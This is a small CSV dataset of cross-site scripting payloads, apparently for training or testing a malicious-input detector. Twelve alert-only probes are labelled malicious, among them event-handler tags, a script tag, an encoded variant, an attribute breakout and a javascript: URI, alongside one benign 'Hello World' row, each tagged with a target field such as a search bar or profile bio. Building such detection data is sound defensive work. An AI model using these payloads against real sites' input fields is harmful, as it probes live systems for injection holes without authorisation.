"payload","source","is_malicious","notes","input_field"
"<details open ontoggle=alert(1)>","generated","True","event-based, <details open ontogg","search_bar"
"<audio src=x onerror=alert(1)>","generated","True","event-based, <audio src=x onerror","search_bar"
"%3Cimg%20src=x%20onerror=alert(1)%3E","generated","True","event-based, %3Cimg%20src=x%20one","search_bar"
"""><img src=x onerror=alert(1)>","generated","True","event-based, ""><img src=x onerror","search_bar"
"<select onchange=alert(1)>","generated","True","event-based, <select onchange=ale","search_bar"
"<textarea onfocus=alert(1) autofocus>","generated","True","event-based, <textarea onfocus=al","search_bar"
"<button onclick=alert(1)>Click</button>","generated","True","event-based, <button onclick=aler","search_bar"
"<script>alert(1)</script>","generated","True","script-based, <script>alert(1)</sc","profile_bio"
"<img src=x onerror=alert(1)>","generated","True","event-based, <img src=x onerror=a","search_bar"
"<video src=x onerror=alert(1)>","generated","True","event-based, <video src=x onerror","search_bar"
"javascript:alert(document.location)","generated","True","dom-based, javascript:alert(doc","profile_bio"
"<img src=invalid onerror=alert(1)>","generated","True","event-based, <img src=invalid one","search_bar"
"Hello World","generated","False","Non-malicious text","search_bar"
